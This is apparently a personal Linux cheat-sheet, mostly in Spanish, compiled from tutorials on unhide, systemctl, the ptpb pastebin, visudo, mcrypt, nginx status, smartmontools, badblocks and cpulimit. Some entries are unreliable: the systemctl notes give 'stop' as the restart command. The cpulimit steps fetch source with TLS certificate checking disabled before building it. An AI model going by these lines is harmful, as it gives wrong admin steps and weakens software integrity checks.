	 0x0000001d (RUNPATH)                    Library runpath: [/home/nick/Development/libraryTutorial]
	 0x0000000c (INIT)                       0x804843c
	 0x0000000d (FINI)                       0x8048674
	 0x00000019 (INIT_ARRAY)                 0x8049ef0
	 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
	 0x0000001a (FINI_ARRAY)                 0x8049ef4
	 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
	...

Libraries on Linux… nothing to it eh?

#############################################################################################################################################################################################

############################################################################################ unhide #########################################################################################

#### unhide #### backdoor

# Unhide: encontrar procesos y puertos ocultos en Linux #

Unhide es una excelente herramienta forense de GNU/Linux que permite encontrar tanto procesos como puertos en escucha ocultos en el sistema. Este tipo de procesos y listeners suelen aparecer cuando el sistema ha sufrido algún tipo de ataque y ha sido infectada con un rootkit. También está disponible para Windows, ambas versiones se pueden descargar desde el sitio web www.unhide-forensics.info


# Instalación #

Para descargarla por repositorios en Debian y Ubuntu:

# apt-get install unhide


# Para descargarla por repositorios en RHEL, CentOS, Fedora, etc utilizamos el repositorio de RepoForge (bajad el rpm según arquitectura): #

# wget http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.3-1.el6.rf.i686.rpm
# yum install rpmforge-release-0.5.3-1.el6.rf.i686.rpm 
# yum install unhide


# unhide para procesos #

Básicamente, unhide (modo ps)utiliza tres técnicas para encontrar los procesos:

Comparar la salida del comando /bin/ps con los datos que hay en el filesystem /proc. Para utilizar esta técnica ejecutamos el comando con el parámetro “proc”:

# $ unhide proc
Unhide 20100201

http://www.security-projects.com/?Unhide

[*]Searching for Hidden processes through /proc scanning

Comparar la información del comando /bin/ps con la información recolectada de syscalls (system call scanning). Para ello pasamos el parámetro “sys”:


$ unhide sys
Unhide 20100201

http://www.security-projects.com/?Unhide

[*]Searching for Hidden processes through kill(..,0) scanning

[*]Searching for Hidden processes through  comparison of results of system calls

[*]Searching for Hidden processes through getpriority() scanning

[*]Searching for Hidden processes through getpgid() scanning

[*]Searching for Hidden processes through getsid() scanning

[*]Searching for Hidden processes through sched_getaffinity() scanning

[*]Searching for Hidden processes through sched_getparam() scanning

[*]Searching for Hidden processes through sched_getscheduler() scanning

[*]Searching for Hidden processes through sched_rr_get_interval() scanning

[*]Searching for Hidden processes through sysinfo() scanning

HIDDEN Processes Found: 0


# Y por última la técnica desesperada con el parámetro “brute”, disponible sólo es kernels superiores a la versión 2.6. Esta técnica consiste en buscar por fuerza bruta en todos los PIDs del sistema. #

# unhide brute

unhide para puertos y UDP en escucha

El modo TCP de unhide permite identificar los puertos que están escuchando (TCP y UDP) en nuestro sistema pero que por contra no aparecen al ejecutar el comando netstat:

# unhide-tcp

#############################################################################################################################################################################################

########################################################################################## systemctl ########################################################################################

#### systemctl

# listar todos los servicios activos o incativos #

systemctl list-units -t service --all

systemctl list-unit-files

# listar unicamente los servicios habilitados que se inician activos #

systemctl list-units -t service

# comprobar el estado de un servicio #

systemctl status cman.service

# como iniciar un servicio (no en cada inicio booteo del sistema) #

systemctl start service.service   - systemctl start sshd.service

# como detener un servicio (no en cada inicio booteo del sistema) #

systemctl stop cman.service

# como reiniciar un servicio que este corriendo actualmente #

systemctl stop service.service   - systemctl stop sshd.service

# iniciar habilitar un servicio en cada booteo del sistema #

systemctl enable service.service   - systemctl enable sshd.service

# deshabilitar detener un servicio en cada booteo del sistema

systemctl disable service.service  - systemctl disable sshd.service

# comprobar si un servicio se inicia al inicio del sistema #

systemctl is-enabled service.service; echo $?   - systemctl is-enabled sshd.service; echo $?

# para reiniciar el sistema podemos correr #

systemctl halt, poweroff, or reboot

# cambiar el hostname #

sudo hostnamectl set-hostname "norris"

#############################################################################################################################################################################################

############################################################################################# ptpb ##########################################################################################

#### ptpb

#### ptpb es un servicio de pastebin y acortador de url al mismo tiempo

# abstract #


Create a new paste from the output of 'ls':

    ls | curl -F c=@- https://ptpb.pw

A HTML form is also provided for convenience paste
and file-uploads from web browsers.

terminology


# id #

    One of:

    - a four character base66 paste id

    - a four character base66 paste id, followed by a period-delimiter
      and a mimetype extension

    - a three character base66 url redirect id

    A mimetype extension, when specified, is first matched with the
    with a matching mimetype known to the system, then returned in the
    HTTP response headers.

# lexer #

    A 'lexer' is an alias of a pygments lexer; used for syntax
    highlighting.

# uuid #

    The string representation of a RFC 4122 UUID. These are used as a
    weak form of 'shared secret' that, if known, allow the user to
    modify the pastes.

# handler #

    A one-character handler identifier.

# handlers #


r

    render: This expects reStructuredText in the paste
    content and gives HTML output.

# routes #


GET /<id>

    Retrieves paste or url redirect.

    If a paste: returns the matching paste, verbatim and unmolested.

    If a url redirect: returns HTTP code 301 with the location of the
    redirect.

GET /<id>/<lexer>

    Like the above, but decodes and applies syntax highlighting to
    pastes via HTML/CSS.

    Line numbering and fragments are included, and can be used to link
    to individual lines within the paste.

GET /<handler>/<id>

    Like the above, but paste content is mangled by said handler
    before being returned.

POST /

    Creates a new paste; returns GET URL and secret UUID.

    Only multipart/form-data is supported; other content types are
    not tested.

    The 'name' disposition extension parameter must be present, and
    its value must be 'c'.

    Unless the 'filename' disposition extension parameter is
    specified, the form data is decoded. The value of the 'filename'
    parameter is split by period-delimited extension, and appended to
    the location in the response.

PUT /<uuid>

    Replaces the content of the paste that matches the provided UUID.

    Form submission is otherwise identical to POST.

DELETE /<uuid>

    Deletes the paste that matches the provided UUID.

POST /u

    Creates a new url redirect (short url).

    The form content will be decoded, and truncated at the first
    newline or EOF, whichever comes first. The result of that is then
    returned in a HTTP 301 response with the form content in the
    Location header.

GET /f

    Returns HTML form that can be used for in-browser paste creation
    and file uploads.

GET /s

    Returns paste statistics; currently paste count and total size.

GET /l

    Returns available lexers, newline-delimited, with space-delimited
    aliases.


# examples #


No really, how in the name of Gandalf's beard does this actually work? Show me!

# Create a paste from the output of 'dmesg': #

    $ dmesg | curl -F c=@- https://ptpb.pw
    https://ptpb.pw/QQQP
    uuid: 17c5829d-81a0-4eb6-8681-ba72f83ffbf3

# Take that paste, and replace it with a picture of a baby skunk: #

    $ curl -X PUT -F c=@- https://ptpb.pw/17c5829d-81a0-4eb6-8681-ba72f83ffbf3 < baby-skunk.jpg
    https://ptpb.pw/QQQP updated.

# Append '.jpg' to hint at browsers that they should probably display a jpeg image: #

    https://ptpb.pw/QQQP.jpg

# Actually, that picture is already on imgur; let's delete that paste and make a shorturl instead: #

    $ curl -X DELETE https://ptpb.pw/17c5829d-81a0-4eb6-8681-ba72f83ffbf3
    https://ptpb.pw/QQQP deleted.
    $ curl -F c=@- https://ptpb.pw/u <<< https://i.imgur.com/CT7DWCA.jpg
    https://ptpb.pw/QQ0

# Well, it is shorter.. #

# Put my latest 'hax.py' script on ptpb: #

    $ curl -F c=@- https://ptpb.pw < hax.py
    https://ptpb.pw/QQQ_
    uuid: [redacted]

# Now I want to syntax highlight and draw attention to one particular line: #

    https://ptpb.pw/QQQ_/py#L-24

# Like it? Put a convience shell function in your bashrc: #

    pb () { curl -F "c=@${1:--}" https://ptpb.pw }

# This uploads paste content stdin unless an argument is provided, otherwise uploading the specified file. #

# Now just: #

    $ command | pb
    $ pb filename

# authors #

Joe Pettit
Zack Buhman

# duck sauce #

https://github.com/silverp1/pb


#############################################################################################################################################################################################

############################################################################################ hacker #########################################################################################

#### hacker

# A hacker is a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular, as defined by Request for Comments (RFC) 1392 - i.e. a good programmer  -- crackers on the other hand break systems #

#############################################################################################################################################################################################

####################################################################################### visudo vipw vigr ####################################################################################

#### visudo #### vipw #### vigr


# visudo, vipw y vigr: editando ficheros críticos en Linux de forma segura #

visudoSiguiendo con el tema tratado en el anterior post sobre como encontrar fallos e inconsistencias en los ficheros passwd y shadow, vamos a ver como a la hora de editar ciertos ficheros críticos del sistema debemos asegurarnos de hacerlo de forma correcta. Ficheros como /etc/passwd, /etc/group, /etc/shadow o /etc/sudoers pueden editarse ‘al vuelo‘ con un editor normal (gedit, vi, vim, nano…) pero corremos el peligro de que mientras lo estamos editando sus datos se hayan actualizado y se pierdan los cambios.


# visudo #

El comando visudo permite modificar en modo seguro el fichero /etc/sudoers. La diferencia de editarlo con visudo a hacerlo con cualquier otro editor es que visudo bloquea el fichero para evitar ediciones simultaneas. Otro punto a favor de editar sudoers de esta forma es que en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis y todo tipo de errores, y en caso de encontrarlos no nos permitirá guardar el fichero y nos indicará el número de línea donde se encuentra el error, permitiéndonos editar el fichero o salir sin guardar.

# visudo

Durante la edición:

$ ls -l /etc/sudoers*
-r--r----- 1 root root  574 2011-04-15 19:02 /etc/sudoers
-rw------- 1 root root  574 2011-04-15 19:02 /etc/sudoers.tmp

Y en el caso de que cometamos un fallo en la sintaxis dentro del archivo, al guardar nos avisa del problema:

# visudo
>>> /etc/sudoers: syntax error near line 9 <<<
What now? 
Options are:
  (e)dit sudoers file again
  e(x)it without saving changes to sudoers file
  (Q)uit and save changes to sudoers file (DANGER!)



# vipw y vigr #

Los comandos vipw y vigr permiten editar los ficheros /etc/passwd y /etc/group respectivamente de forma segura. Si quisiéramos editar el fichero /etc/shadow y /etc/gshadow deberíamos utilizar el parámetro -s.

Cabe decir que es recomendable evitar la manipulación directa de estos ficheros y que es conveniente usar los comandos correspondientes para gestión de usuarios: crear, eliminar y modificar usuarios de sistema en Unix. Si fuera estrictamente necesario, la modificación de passwd y shadow sería del siguiente modo:

Primero editamos el fichero /etc/passwd:

# vipw
Ha modificado /etc/passwd.
Necesitará modificar /etc/shadow por consistencia.
Use la orden «vipw -s» para hacerlo.

Y posteriormente editamos el fichero shadow y gshadow:

# vipw -s
vipw: /etc/shadow no está cambiado

El bloqueo durante la ejecución:

$ ls -l /etc/passwd*
-rw-r--r-- 1 root root 1851 2014-12-18 19:29 /etc/passwd
-rw-r--r-- 1 root root 1852 2014-12-18 19:29 /etc/passwd-
-rw-r--r-- 1 root root 1851 2014-12-18 19:29 /etc/passwd.edit
-rw------- 1 root root    5 2014-12-18 19:30 /etc/passwd.lock

Si no quisiéramos editar el fichero shadow a mano podemos decirle al sistema que lo actualice de forma automática con el comando pwconv:

# pwconv

Y lo mismo cuando editamos grupos con vigr, para evitar la modificación manual de gshadow podemos usar grpconv:

# grpconv

Al igual que con visudo, vigr y vipw bloquean los ficheros para evitar que puedan ser editados a la vez. Para evitar esto se crea un fichero temporal /etc/ptmp y se deshabilita la escritura del mismo.

Os recomiendo revisar las páginas man de los comandos para encontrar información más detallada sobre el funcionamiento y posibilidades de cada uno de ellos.


#############################################################################################################################################################################################

########################################################################################### rtorrent ########################################################################################

#### rtorrent-color

==> Set colors using the options below in .rtorrent.rc:
==> Options: color_inactive_fg, color_inactive_bg, color_dead_fg, color_dead_bg, 
==>          color_active_fg, color_active_bg, color_finished_fg, color_finished_bg, 
==>
==> Colors: 0 = black 1 = red 2 = green 3 = yellow 4 = blue 5 = magenta 6 = cyan 7 = white
==>
==> Nice example-config: color_inactive_fg = 4
==>                      color_dead_fg = 1
==>                      color_active_fg = 3
==>                      color_finished_fg = 2
==>
==> Explanation:
==>  Inactive: Deactivated torrent
==>  Dead:     Active but can't find seeders
==>  Active:   Active and downloading
==>  Finished: Download done
==>  If the torrent is highlighted (using bold text) you're uploading data

#############################################################################################################################################################################################

########################################################################################## cabextract #######################################################################################

#### cabextract

#### cabextract sirve para descomprimir archivos .cab que son los archivos comprimidos que contienen las librerias del windows

cabextract archivo.cab


#############################################################################################################################################################################################

############################################################################################ mcrypt #########################################################################################

#### mcrypt

#### Installation ####

# To install mcrypt on Ubuntu, run: #

sudo apt-get install mcrypt


#### Usage 

# List the algorithms supported #

mcrypt --list


# We will use arcfour for our example. #
# List hashing algorithms supported #

mcrypt --list-hash


# The hash is a digest added to an encrypted file, in order to detect corruption. We will use sha384 #
# Compression options #

-z : gzip
-p : bzip2


# Compress a file #

mcrypt -a arcfour -h sha384 -p webcheck.dat

where:

-a : algorithm to use [optional]
-h : hashing algorithm to use [optional]
-p : use bzip2 compression [optional]
mcrypt will prompt you for the key (or password).
The file is saved as webcheck.dat.bz2.nc.


# Decrypt the above file #

mcrypt -d webcheck.dat.bz2.nc
OR
mdecrypt webcheck.dat.bz2.nc


# Extract the bz2 archive to get the original file #

bunzip2 webcheck.dat.bz2


# Encrypt multiple files #

mcrypt file1 file2


# mcrypt can handle files only. To encrypt a directory archive and compress it first #

tar -jcvf mydir.tar.bz2 mydir/
mcrypt mydir.tar.bz2

It is possible to pass a key in the command-line using the -k parameter or in mcrypt configuration file (~/.mcryptrc) but these are not advisable as the key is exposed.

Webpage: http://mcrypt.sourceforge.net/


############################################################################################# nginx #########################################################################################

#### nginx

#### Habilitar en nginx la página de Status ####

El servidor web Nginx permite habilitar de un modo similar a Apache una página web mediante la cual monitorizar el estado y algunos parámetros del servidor. Por una parte está el módulo “ngx_http_stub_status_module” que ofrece una página básica en la que se muestra el estado del server y por otro, el módulo de la versión comercial “ngx_http_status_module” que ofrece información mucho más detallada y personalizable.

Del módulo comercial no voy a hablar, podéis ver la información del mismo en la documentación de NGINX y visitar esta demo del resultado final.
Instalar el módulo de status http_stub_status_module

Depende de si habéis compilado manualmente NGINX o el paquete precompilado que estéis usando puede que el módulo esté habilitado o no. Para verificarlo se ejecuta el siguiente comando que muestra la línea de compilación y todos los módulos:

# nginx -V | grep -o with-http_stub_status_module
with-http_stub_status_module

La salida completa:

# nginx -V 
nginx version: nginx/1.6.2
built by gcc 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) 
TLS SNI support enabled
configure arguments: --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx 
--conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log
--http-log-path=/var/log/nginx/access.log --http-client-body-temp-path=/var/lib/nginx/tmp/client_body
--http-proxy-temp-path=/var/lib/nginx/tmp/proxy --http-fastcgi-temp-path=/var/lib/nginx/tmp/fastcgi
--http-uwsgi-temp-path=/var/lib/nginx/tmp/uwsgi --http-scgi-temp-path=/var/lib/nginx/tmp/scgi
--pid-path=/var/run/nginx.pid --lock-path=/var/lock/subsys/nginx --user=nginx --group=nginx
--with-file-aio --with-ipv6 --with-http_ssl_module --with-http_spdy_module --with-http_realip_module
--with-http_addition_module --with-http_xslt_module --with-http_image_filter_module
--with-http_geoip_module --with-http_sub_module --with-http_dav_module --with-http_flv_module
--with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module
--with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module
--with-http_stub_status_module --with-http_perl_module --with-mail --with-mail_ssl_module
--with-pcre --with-google_perftools_module --with-debug
--with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector
--param=ssp-buffer-size=4 -m64 -mtune=generic' --with-ld-opt=' -Wl,-E'

En el ejemplo anterior vemos que está compilado así que podemos utilizarlo. En caso contrario hay que recompilar NGINX añadiendo el módulo, disponible en el código fuente, ejemplo:

# ./configure \
  --prefix=/opt/nginx \
 --sbin-path=/opt/nginx/sbin \
 --conf-path=/opt/nginx/nginx.conf \
 --pid-path=/opt/nginx/run/nginx.pid \
 --with-http_ssl_module \
 --with-http_gzip_static_module \
 --with-http_stub_status_module 

Podéis visitar el artículo de instalación de NGINX si tenéis alguna duda, ahí os enseño como compilarlo manualmente.
Configurar el módulo de status http_stub_status_module

Una vez instalado, la configuración es sencilla. Simplemente añadimos un bloque “Location” dentro del bloque “server” correspondiente especificando la URL que mostrará la página de status (se activa con “stub_status on;”) y opcionalmente las IPs o rangos que permitimos acceder:

location /nginx-status {
 stub_status on;
 allow 10.0.0.100;
 allow 192.168.1.0/24;
 allow 127.0.0.1;
 deny all;
 }

El resultado al acceder a la URL es algo similar a:

# curl http://localhost/nginx-status
Active connections: 1 
server accepts handled requests
 4 4 6 
Reading: 0 Writing: 1 Waiting: 0 

Active connections: número de conexiones activas (incluye las Waiting, que en caso de tener keepalive activo suelen ser muchas)
accepts: conexiones de cliente aceptadas
handled: número total de conexiones que se están gestionando. El valor debería ser igual que “accepts” a no ser de que exista algún problema)
requests: número total de peticiones de clientes
Reading: número de conexiones de las que nginx está leyendo la cabecera request.
Writing: número de conexiones de las que nginx está enviando respuesta al cliente
Waiting; conexiones en espera de aceptar requests de clientes.


#### robot.txt example

User-agent: *
Disallow: /administration/
Disallow: /locale/
Disallow: /themes/
Disallow: /print.php

#############################################################################################################################################################################################

######################################################################################## smartmontools ######################################################################################

#### smartmontools

#### La tecnología S.M.A.R.T., siglas de Self Monitoring Analysis and Reporting Technology, consiste en la capacidad de detección de fallos del disco duro. La detección con anticipación de los fallos en la superficie permite al usuario el poder realizar una copia de su contenido, o reemplazar el disco, antes de que se produzca una pérdida de datos irrecuperable.


#### instalacion ####

sudo apt-get install smartmontools


#### verificar si está activado el SMART en el hdd ####

sudo smartctl -i /dev/sda


#### En caso de que NO salga "Enabled", o sea, que no esté habilitado, lo pueden habilitar así: ####

sudo smartctl -s on -d ata /dev/sda


#### Para hacer una prueba corta y comprobar el estado de disco (demora 1 minuto aproximadamente) es: ####

sudo smartctl -t short /dev/sda


#### Para hacer la prueba larga: ####

sudo smartctl -t long /dev/sda


#### Les recomiendo entre cada prueba revisar el log de errores, para ello sería: ####

sudo smartctl -l error /dev/sda


#### Si el disco duro tiene problemas entonces al ejecutar el comando anterior, el output sería similar a este: ####

smartctl 6.3 2014-07-26 r3976 [x86_64-linux-3.18.5-1-ARCH] (local build)
Copyright (C) 2002-14, Bruce Allen, Christian Franke, www.smartmontools.org
=== START OF READ SMART DATA SECTION ===
SMART overall-health self-assessment test result: PASSED
Please note the following marginal Attributes:
ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE
190 Airflow_Temperature_Cel 0x0022 044 033 045 Old_age Always ## FAILING_NOW ## 56 (96 110 58 25)


#### Para más detalles pueden usar este otro comando: ####

sudo smartctl --attributes --log=selftest /dev/sda


#### Lo cual les mostraría un output similar a este, digo similar y no igual porque evidentemente es algo difícil que dos discos duros fallen exactamente igual jeje: ####

smartctl 6.3 2014-07-26 r3976 [x86_64-linux-3.18.5-1-ARCH] (local build)
Copyright (C) 2002-14, Bruce Allen, Christian Franke, www.smartmontools.org
=== START OF READ SMART DATA SECTION ===
SMART Attributes Data Structure revision number: 10
Vendor Specific SMART Attributes with Thresholds:
ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE
1 Raw_Read_Error_Rate     0x000f   098   092   006    Pre-fail  Always       -       238320363
3 Spin_Up_Time            0x0003   100   100   000    Pre-fail  Always       -       0
4 Start_Stop_Count        0x0032   100   100   020    Old_age   Always       -       587
5 Reallocated_Sector_Ct   0x0033   100   100   036    Pre-fail  Always       -       9
7 Seek_Error_Rate         0x000f   077   060   030    Pre-fail  Always       -       51672328
9 Power_On_Hours          0x0032   095   095   000    Old_age   Always       -       4805
10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0
12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       586
184 Unknown_Attribute       0x0032   100   100   099    Old_age   Always       -       0
187 Reported_Uncorrect      0x0032   001   001   000    Old_age   Always       -       417
188 Unknown_Attribute       0x0032   100   099   000    Old_age   Always       -       4295032833
189 High_Fly_Writes         0x003a   094   094   000    Old_age   Always       -       6
190 Airflow_Temperature_Cel 0x0022   044   033   045    Old_age   Always   FAILING_NOW 56 (96 122 58 25)
194 Temperature_Celsius     0x0022   056   067   000    Old_age   Always       -       56 (0 23 0 0)
195 Hardware_ECC_Recovered  0x001a   043   026   000    Old_age   Always       -       238320363
197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       49
198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       49
199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0
240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       172082159686339
241 Unknown_Attribute       0x0000   100   253   000    Old_age   Offline      -       2155546016
242 Unknown_Attribute       0x0000   100   253   000    Old_age   Offline      -       3048586928
SMART Self-test log structure revision number 1
Num  Test_Description    Status                  Remaining  LifeTime(hours)  LBA_of_first_error
## 1  Extended offline    Completed: read failure       90%      4789         1746972641 ##


#### Si quieren aún leer mucha más información, el comando para que les muestre un output completo, casi que un debug detallado es: ####

sudo smartctl -d ata -a /dev/sda


#############################################################################################################################################################################################

######################################################################################### packet sender #####################################################################################

#### Packet Sender is a handy utility to send or receive TCP and UDP packets. It is also an excellent tool (like Ostinato) to learn or analyse network packets as it shows the whole packet to be sent in hex. A packet has a name, destination address (domains will trigger an IP lookup), port, and data associated with it. ####

# Features #

    GUI and CLI interfaces
    Send multiple packets simultaneously
    Edit fields of saved packets
    Resend packets
    Supports mixed ASCII and HEX notation
    Optional response
    Copy raw packet data to clipboard
    Roll traffic log
    Import or export packets
    Supports Linux, Windows and Mac. The Android version is commercial.

# Installation #

The pre-compiled packages for Ubuntu is available for download here. Note that version 2.0 needs Qt 5.4.
Usage

The GUI is self-explanatory. Available command-line options:

# Syntax: packetsender [options] address port data #

# Options: #

-?, -h, --help      Displays this help.
-v, --version       Displays version information.
-q, --quiet         Quiet mode. Only output received data.
-x, --hex           Parse data as hex (default).
-a, --ascii         Parse data as mixed-ascii (like the GUI).
-A, --ASCII         Parse data as pure ascii (no \xx translation).
-w, --wait <milliseconds>   Wait up to <milliseconds> for a response after sending. Zero means do not wait (Default).
-b, --bind <port>   Bind port. Default is dynamic.
-t, --tcp           Send TCP (default).
-u, --udp           Send UDP.
-n, --name <name>   Send previously saved packet named <name>. Other options overrides saved packet parameters.

-Arguments:
-address    Destination address. Optional for saved packet.
-port       Destination port. Optional for saved packet.
-data       Data to send. Optional for saved packet.

# Example usage: #

$ packetsender -taw 500 ubuntu.com 22 "Hello\nWorld"
TCP (56620)://91.189.94.156:22 48 65 6c 6c 6f 0a 57 6f 72 6c 64
Response HEX:53 53 48 2D 32 2E 30 2D 4F 70 65 6E 53 53 48 5F 35 2E 33 70 31 20 44 65 62 69 61 6E 2D 33 75 62 75 6E 74 75 33 2E 31 2E 49 53 2E 31 30 2E 30 34 0D 0A
Response ASCII:SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu3.1.IS.10.04\r\n

# Webpage: http://packetsender.com/ #

#############################################################################################################################################################################################

########################################################################################## surfwar ##########################################################################################

           ______  _     _  ______   _______  ______   _______  _  _  _
          / _____)(_)   (_)(_____ \ (_______)(_____ \ (_______)(_)(_)(_)
         ( (____   _     _  _____) ) _____    _____) ) _______  _  _  _
          \____ \ | |   | ||  __  / |  ___)  |  __  / |  ___  || || || |
          _____) )| |___| || |  \ \ | |      | |  \ \ | |   | || || || |
         (______/  \_____/ |_|   |_||_|      |_|   |_||_|   |_| \_____/

You might have heard the allegations about search giants recording your data or tracking it. And you might have heard about Julian Assange. Would it be surprising to know that Assange wrote a command-line perl based tool to search Google (and many other web services) at lightning speed… a tool sans the tracking? I guess not.

Such a tool exists, written in 2000. It’s Surfraw.

Each supported search engine or database (like Google, Wikipedia, Slashdot etc.) is called an elvi in Surflaw, apparently as a tribute to Elvis (Ref: Wikipedia).
Features

    Search tons of websites in addition to Google. To get the full list

    $ surfraw -elvi

    Supports bookmarks
    Supports bash completion (elvi names, options, arguments) using TAB
    Use Google Translate, images, news, mps, video etc.
    Supports safe search filter
    Works best with text-based browsers like links, lynx, w3m

Installation

To install Surfraw on Ubuntu, run:

$ sudo apt-get install surfraw surfraw-extra

Configuration

The user-specific configuration file is ~/.surfraw.conf. The syntax is simple – defyn is used for boolean configuration variables, def for all others. Example configuration:

def SURFRAW_text_browser      /usr/bin/lynx
defyn SURFRAW_graphical       yes
def SURFRAW_graphical_browser firefox
def SURFRAW_results           10
def SURFRAW_lang              uk

Usage

Surfraw has many options, many of them specific to the elvi (search service). If you do not want to type surfraw all the time, sue the alias sr.

    The general syntax

    sr elviname [options] search terms..

    Search Google with multiple terms and limit results to 100

    $ sr google -results=100 foo "bar baz" bam

    Search Wikipedia

    $ sr wikipedia surfraw

    Search a phrase

    $ sr austlii -method=phrase dog like

    Get a rhyming word

    $ surfraw rhyme Julian

    Search a RFC about mime

    $ sr rfc s/mime

    Translate a word

    $ sr translate logiciel

http://surfraw.alioth.debian.org/  -  with love, from Julian Assange

#############################################################################################################################################################################################

########################################################################################### badblock ########################################################################################

#### badblock

Hay que tener la idea básica de que un disco contiene sectores, y dentro de esos sectores se guarda la información, para más tarde ser leída..

Entonces, con "badblocks" (nuestro programita) se propone verificar el estado todos los sectores de un disco, para encontrar los sectores "rotos" (dañados físicamente)..

Para luego omitir esos sectores rotos, para que no se usen..

Porque omitirlos??
Porque un sector roto simplemente no sirve, porque cada ves que uno guarda información en ese sector, se guardar mal la información y se pierde..
Porque??
Porque esa superficie está dañada físicamente..

..
No quiero hacer mucho enrosque, porque hasta yo me confundo..xD
Pero.. sería mejor ser más preciso y exacto..
..
Resumiendo
Todos tenemos un disco duro viejo, o un pendrive..
De tanto uso, estos se dañan físicamente..
Entonces no está de más, buscar esos sectores dañados y dejarlos que descansen en paz por siempre.. R.I.P..

..
Entonces.. en breves pasos.. que haremos??
1) Usar badblocks, para encontrar los sectores defectuosos de los que hablamos, y obtener una lista con los la ubicación de esos sectores rotos..
2) Formatear nuestro pendrive con la lista que badblocks nos dio.
3) Revisar como quedó nuestro disco duro o pendrive.

Paso a Paso

1) Si tenemos un pendrive lo conectamos..
Lo primero que necesitamos es saber en donde está ubicado nuestro pendrive..
Para ello abrimos una terminal e ingresamos
 sudo fdisk -l 

    nota dijo:

    El ultimo carácter es una "L" minúscula


Como se ve en la imagen, MI pendrive de 2 GB, está ubicado en "/dev/sdc" así que mi tutorial será con esa ubicación., y cada uno deberá cambiarlo por su 
ubicación..

    nota dijo:


    Para los que no saben.. /dev/sdc es mi pendrive.. y /dev/sdc1 es la partición de mi pendrive.. solo tiene una.. más adelante hará falta saber esto..




2) Ahora usaremos badblocks para que busque los errores fisicos en nuestro pendrive..

Abrimos una terminal e ingresamos:
 sudo badblocks -s -v /dev/sxX -o un_nombre.txt 

    notas dijo:


    Debes reemplazar:
    --Las letras "xX" por lo que obteniste en el paso uno.. en mi caso por "dc"..
    --"un_nombre" por el nombre que le quieras poner al txt.. (no se admiten espacios " " )


En mi caso el comando quedará así:
 sudo badblocks -s -v /dev/sdc -o 2GB.txt 


Y solo queda esperar a que termine..
El resultado será este..


Como verán acá lo importante es la siguiente linea
"Paso terminado, se encontraron X bloques dañados"

Bloques totales=1959935
Bloques dañados=0
Bloques que se pueden usar=1959935

Como verán para suerte mia.. mi pendrive funciona expectacular.. no está roto.
Si no, en donde dice .. bloques dañados abria un número positivo distinto de 0..
Aclaramos si no se entedió:
0 bloques dañados = Pendrive Sano
1 o + (2,3,4,5,6,10,100,10000,100000,) = Pendrive Dañado
Para aquellos como yo.. pueden saltar en una pata..
Para los no tan suertudos.. por favor continuen al paso 3 (que es por lo que estamos acá)

3) En este paso son tres minipasos..
3.1) Ubicar el dispositivo con "sudo fdisk -l" (vease paso 1)
3.2) Desmontar el dispositivo
3.3) Formatear

..
3.2) Desmontamos nuestro pendrive..
Como??.. así:
 sudo umount /dev/sxx1 
En mi caso..
 sudo umount /dev/sdc1 

Fijensé en la imagen de más abajo si no entienden

3.3) Ahora formateamos nuestro pendrive utilizando la lista que hicimos en el paso 2..

Así:

 sudo mkdosfs -F32 -v -n "Ponle nombre a pendrive" -l el_archivo_anterior.txt /dev/sxx1 

En mi caso quedaría así..

 sudo mkdosfs -F32 -v -n "Cualquier_nombre" -l 2GB.txt /dev/sdc1 

    notas dijo:


    --SI o SI debe ir el 1; al final de "sdc" en mi caso.. Con ese uno marcamos que sea la partición 1 la que se formatee.. normalmente la única en un pendrive..
    --El nombre debe ir entre "comillas"
    --Por "el_archivo_anterior.txt" me refiero al nombre que le pusiste al .txt del paso 2.. en MI caso 2GB.txt se llamaba mi archivo (vease paso 2)
    --/dev/sxX debe ir tu pendrive, el mismo del paso dos.. teóricamente.. si tienes dudas repites el paso uno, para asegurarte en donde está ubicado tu pendrive.. y el 1 al final va SI o SI.. como dije más arriba



El resultado que dará la terminal será algo así:


Para que recuerden que hice en la última imagen:
1) "sudo fdisk -l" y con ese me fije en donde estaba mi pendrive y su partición 1.. el resultado fue.. "/dev/sdc1"
2) Desmonté el dispositivo haciendo "sudo umount /dev/sdc1" obvio, la ubicación la obtienen haciendo el paso de arriba..
3) Formateé haciendo: "sudo mkdosfs -F32 -v -n "Cualquier_nombre" -l 2GB.txt /dev/sdc1"

    nota dijo:


    Espero que se entienda que yo uso "/dev/sdc1" porque es mi caso..
    Ustedes usarán el mismo que encontraron en el paso N°1.. ok??



..
Bue.. hasta acá llegó el tuto.. espero que no se hayan hecho un lio..
Y cualquier cosa pregunten y iré anotando las preguntas y respuestas acá abajo.. así no hace falta buscar en los coments..

Saludos.. y espero les sirva.. 

#############################################################################################################################################################################################

########################################################################################### cpulimit ########################################################################################

#### cpulimit is a small program written in C that allows to limit CPU usage by Linux process. Limit is specified in percentage so it’s possible to prevent high CPU load generated by scripts, programs or processes.

I found cpulimit pretty useful for the scripts running from cron, for example I can do overnight backups and be sure that compression of 50GB file via gzip won’t eat all CPU resources and all other system processes will have enough CPU time.

In most of Linux distributions cpulimit is available from binary repositories so you can install it using commands:

sudo apt-get install cpulimit

or

sudo yum install cpulimit

If it’s not possible in your distro then it’s extremely easy to compile it:

cd /usr/src/
wget --no-check-certificate https://github.com/opsengine/cpulimit/tarball/master -O cpulimit.tar
tar -xvf cpulimit.tar
cd opsengine-cpulimit-9df7758
make
